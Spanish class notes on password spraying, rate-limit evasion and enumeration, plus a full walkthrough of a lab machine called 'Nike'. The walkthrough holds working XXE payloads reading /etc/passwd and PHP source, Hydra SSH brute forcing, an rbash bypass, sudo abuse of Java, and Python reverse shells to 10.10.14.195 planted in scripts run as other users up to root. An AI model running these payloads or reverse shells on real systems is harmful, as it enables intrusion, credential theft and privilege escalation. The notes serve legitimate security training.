## ① Repaso metodológico — Fuerza bruta, Password Spraying, Directory Listing, Fuzzing

Carlos repasa los conceptos clave de la sesión del 02/07 antes de meterse en las máquinas.

### La distinción crítica: ¿qué activa el rate limit?

```
Rate limit = N intentos / unidad de tiempo (ej. 3 intentos / 5 min por usuario)
```

| Técnica | Endpoint | ¿Activa rate limit? | Por qué |
|---------|----------|---------------------|---------|
| **Fuerza bruta** | Mismo endpoint (ej. `/wp-login.php` user=admin) | **SÍ** | Golpea el mismo punto repetidamente |
| **Password spraying** | Mismo password, **diferentes usuarios** | **NO** | Cada usuario = endpoint diferente |
| **Directory listing** | **Diferentes directorios** | **NO** | Cada directorio = endpoint diferente |

> [!important] La analogía del SIEM
> "Si yo pregunto '¿me dejas un euro?' a la misma persona 10 veces → me detecta. Si se lo pregunto a 10 personas distintas → comportamiento normal."

### Fuzzing vs Directory Listing

| Aspecto | Directory Listing | Fuzzing |
|---------|-------------------|---------|
| **Qué itera** | Solo directorios | Subdominios, directorios, parámetros, variables |
| **Herramienta** | gobuster, dirsearch, feroxbuster | ffuf, x8 |
| **Versatilidad** | Baja | **Muy alta** (payload en cualquier posición de la URL) |

> [!note] La regla de Carlos
> "Primero directory listing (gobuster -r). Si no encuentras nada o huele raro → fuzzing (ffuf/x8). Metodología: puertos → directorios → ficheros → parámetros → valores."

## ② Máquina Nike — Resolución completa (con Sira)

### Ficha técnica

| Dato | Valor |
|------|-------|
| **Máquina** | Nike (HackerLab) |
| **IP** | 10.0.2.x (BigCover) |
| **Puertos** | 22 (SSH), 80 (HTTP Apache 2.4.62) |
| **Vector inicial** | XXE en `upload.php` → LFI → `/etc/passwd` |
| **Usuarios** | mike, font, pilon, wf, ruth (con `/bin/bash`) |
| **Escalada** | Movimiento lateral: mike → n (Java) → pilon (Python) → root (cron) |

### Reconocimiento

```bash
# 1. Netdiscover
sudo netdiscover -r 10.0.2.0/24

# 2. Nmap
nmap -sVC --open -oA nike 10.0.2.x

# 3. Gobuster con códigos 500 (clave para encontrar datos.php)
gobuster dir -u http://10.0.2.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
 -x php,html,txt,js,json,xml -s "200,301,500" -o nike_dirs.txt
```

> [!warning] El truco del código 500
> `datos.php` devolvía **500 Internal Server Error**. Por defecto gobuster/dirsearch no muestran 500. Hay que incluirlos explícitamente con `-s "200,301,500"` o `--include-status 500`.

### Detección de XXE en upload.php

```
1. Acceder a upload.php → "XML not provided"
2. Burp Suite → Repeater → POST upload.php
3. Probar payloads:
 - "hola" → "Start tag expected"
 - "<?php system('id'); ?>" → "Start tag expected"
 - XML válido simple → 200 OK + **REFLECTED** (body en response)
4. XXE payload:
 <?xml version="1.0"?>
 <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <root><user>&xxe;</user></root>
```

**Resultado:** `/etc/passwd` reflejado en response. Usuarios con bash: `mike, font, pilon, wf, ruth, root`.

### Lectura de datos.php (Base64 encoding)

El archivo `datos.php` tenía código PHP con `<` `>` que rompía el parser XML.

```xml
<!-- Payload con Base64 wrapper -->
<?xml version="1.0"?>
<!DOCTYPE test [
 <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/datos.php">
]>
<root><user>&xxe;</user></root>
```

Decodificar: `echo "BASE64_STRING" | base64 -d`

**Contenido de datos.php:** 5 usuarios + 5 contraseñas (no en rockyou).

### Fuerza bruta / Password Spraying con Hydra

```bash
# Crear diccionarios
echo -e "mike\nfont\npilon\nwf\nruth" > users.txt
echo -e "pass1\npass2\npass3\npass4\npass5" > pass.txt

# Hydra SSH
hydra -L users.txt -P pass.txt ssh://10.0.2.x -V
```

**Resultado:** `mike:password` (Mike era el único que funcionaba).

> [!note] Mike tiene rbash (restricted bash)
> Al conectar por SSH: `rbash` → no permite `cd`, rutas con `/`, redirecciones, modificar variables, comandos con rutas absolutas.

### Bypass de rbash via SSH

```bash
# Opción 1: Especificar shell al conectar
ssh mike@10.0.2.x -t "bash --noprofile"

# Opción 2: SSH con -t y comando
ssh mike@10.0.2.x -t "/bin/bash"
```

> [!important] Diferencia clave
> `ssh user@host comando` ejecuta el comando **en el servidor** y cierra.
> `ssh -t user@host "bash"` abre una **sesión interactiva** con esa shell.

### Movimiento lateral: Mike → N (Java GTFOBins)

```bash
$ sudo -l
User mike may run the following commands:
 (n) NOPASSWD: /usr/bin/java
```

**GTFOBins → Java → Sudo:**

```bash
# En /tmp (donde n tiene permisos)
cd /tmp
cat > shell.java << 'EOF'
public class shell {
 public static void main(String[] args) throws Exception {
 new ProcessBuilder("/bin/bash").start();
 }
}
EOF

# Compilar y ejecutar como n
javac shell.java
sudo -u n /usr/bin/java shell
# ¡Somos n!
```

### Movimiento lateral: N → Pilon (Python script hijacking)

```bash
$ sudo -l
User n may run the following commands:
 (pilon) NOPASSWD: /usr/bin/python3 /opt/suma.py
```

```bash
# Ver suma.py original
cat /opt/suma.py
# import os; os.system("echo testing 123 > test.txt")

# Sobrescribir con reverse shell
cat > /opt/suma.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.195",4444))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF

# Ejecutar como pilon
sudo -u pilon /usr/bin/python3 /opt/suma.py
# ¡Somos pilon!
```

### Escalada final: Pilon → Root (Cron job)

```bash
$ sudo -l
User pilon may run the following commands:
 (root) NOPASSWD: /usr/bin/python3 /opt/backup.py
```

```bash
# Ver backup.py → se ejecuta periódicamente por cron como root
cat /opt/backup.py

# Sobrescribir con reverse shell
cat > /opt/backup.py << 'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.195",5555))
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
EOF

# Esperar cron (o ejecutar si se puede)
sudo -u root /usr/bin/python3 /opt/backup.py
# ¡ROOT!
```

## ④ Conceptos transversales reforzados

### Shells restringidas (rbash, rsh, etc.)

| Restricción | Qué impide |
|-------------|------------|
| `cd` | Cambiar de directorio |
| Rutas con `/` | Ejecutar binarios con path absoluto |
| Redirecciones (`>`, `>>`, `<`) | Input/output redirection |
| Modificar `$PATH`, `$SHELL`, `$ENV` | Environment manipulation |
| Comandos con path absoluto | `/bin/ls` no funciona |

**Bypass universal:** `ssh user@host -t "bash --noprofile"` o `ssh -t user@host "/bin/bash"`

### Movimiento lateral con sudo -u + GTFOBins

```
Patrón universal:
1. sudo -l → buscar (user) NOPASSWD: /ruta/binario
2. GTFOBins → buscar binario → pestaña "Sudo"
3. Ejecutar payload como ese usuario
4. Repetir hasta root
```

### Transferencia de archivos entre máquinas

```bash
# Atacante (donde está el archivo)
cd /directorio/con/archivo
python3 -m http.server 8000

# Víctima
wget http://IP_ATACANTE:8000/archivo
# o
curl -O http://IP_ATACANTE:8000/archivo
```

> [!warning] Siempre en `/tmp`
> "Nunca trabajéis en el home de un usuario para movimiento lateral. Siempre en `/tmp` — todos tienen permisos ahí."
